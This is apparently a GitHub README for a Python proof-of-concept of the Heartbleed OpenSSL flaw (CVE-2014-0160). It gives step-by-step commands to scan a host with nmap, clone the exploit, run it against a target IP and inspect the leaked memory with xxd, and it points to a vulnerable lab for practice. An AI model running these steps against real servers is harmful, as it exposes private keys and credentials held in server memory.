# heartbleed
A Heartbleed (CVE-2014-0160) PoC in Python 3

```
usage: python3 heartbleed.py [-h] host [port]

Heartbleed PoC

positional arguments:
  host        hostname or IP address
  port        TCP port number (default IS 443)

options:
  -h, --help  show this help message and exit
```

1. If you want a vulnerable server to test, you can set it up from [here](https://github.com/jas9reet/heartbleed-lab "Heartbleed lab")
2. Test for heartbleed vulnerability using nmap:
```nmap -v -p8443 --script ssl-heartbleed $IP```

3. Install the script if you haven't already, change to directory:
```
git clone https://github.com/H4R335HR/heartbleed/ && cd heartbleed
```
  
4. Run the script:
```
python3 heartbleed.py $IP 8443
```
5. After running the script, check the output file using xxd to see the results:
```
xxd response_data.bin
```
